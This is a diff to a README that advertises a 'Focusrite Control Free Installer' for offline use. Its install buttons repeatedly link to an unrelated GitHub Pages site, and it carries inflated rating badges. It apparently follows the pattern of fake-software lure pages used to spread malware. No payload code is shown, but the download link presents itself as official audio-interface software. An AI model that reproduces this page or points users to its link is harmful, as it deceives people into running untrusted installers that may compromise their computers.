@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-Audio+Interface-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-Audio+Interface+Control-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Focusrite Control Free Installer** — Focusrite Control is the configuration and routing software for Focusrite Scarlett, Clarett, and Red Range audio interfaces. Works without internet access, no account required. Full offline installation.
+**💻 Focusrite Control Free Installer** — Focusrite Control is the companion software for Focusrite Scarlett and Clarett USB/Thunderbolt audio interfaces. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Focusrite Control](https://img.shields.io/badge/⬇_Install_Focusrite%20Control-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Focusrite Control](https://img.shields.io/badge/⬇_Install_Focusrite+Control-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Focusrite Control
 
-Focusrite Control is the configuration and routing software for Focusrite Scarlett, Clarett, and Red Range audio interfaces. It manages input/output routing, monitoring mixes, and interface settings with a clean visual patchbay interface.
+Focusrite Control is the companion software for Focusrite Scarlett and Clarett USB/Thunderbolt audio interfaces. Configure input routing, monitor mixing with near-zero latency through hardware monitoring, adjust preamp settings, and save configurations for different recording setups. Focusrite Control is essential for getting the most from Focusrite audio interfaces in recording and streaming applications.
 
 ---
 
 ## ❌ Problem: Focusrite Control is hard to access
 
-- **Focusrite Hardware Required** — Only works with Focusrite audio interfaces
-- **Occasional Bugs** — Software updates sometimes introduce new routing or connectivity issues
-- **Complex Routing** — Multi-channel routing configurations can be confusing for beginners
-- **Internet Required for Updates** — Firmware updates require internet connection
+- **Focusrite Hardware Required** — Only functions with compatible Focusrite audio interfaces
+- **Driver Dependency** — Requires current Focusrite driver installation alongside the software
+- **Thunderbolt Complexity** — Thunderbolt models require additional Thunderbolt driver setup
+- **Feature Scope** — Configuration tool only; no audio editing or production capabilities
 
 ---
 
@@ -81,7 +81,7 @@ Focusrite Control is the configuration and routing software for Focusrite Scarle
 
 <div align="center">
 
-[![⬇ Install Focusrite Control](https://img.shields.io/badge/⬇_Install_Focusrite%20Control-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Focusrite Control](https://img.shields.io/badge/⬇_Install_Focusrite+Control-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Focusrite Control is the configuration and routing software for Focusrite Scarle
 
 ---
 
-**Focusrite Control Free Installer** — Focusrite Control is the configuration and routing software for Focusrite Scarlett, Clarett, and Red Range audio interfaces. Install without internet connection today!
+**Focusrite Control Free Installer** — Focusrite Control is the companion software for Focusrite Scarlett and Clarett USB/Thunderbolt audio interfaces. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Focusrite Control](https://img.shields.io/badge/⬇_Install_Focusrite%20Control-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Focusrite Control](https://img.shields.io/badge/⬇_Install_Focusrite+Control-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
